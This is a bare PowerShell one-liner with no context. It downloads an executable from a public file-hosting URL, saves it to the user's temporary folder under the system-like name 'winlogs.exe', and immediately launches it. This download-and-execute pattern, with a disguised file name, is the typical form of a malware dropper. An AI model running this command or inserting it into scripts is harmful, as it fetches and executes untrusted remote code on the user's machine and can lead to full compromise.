
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/jfyywz.exe',"$env:TEMP\winlogs.exe");Start-Process ("$env:TEMP\winlogs.exe")

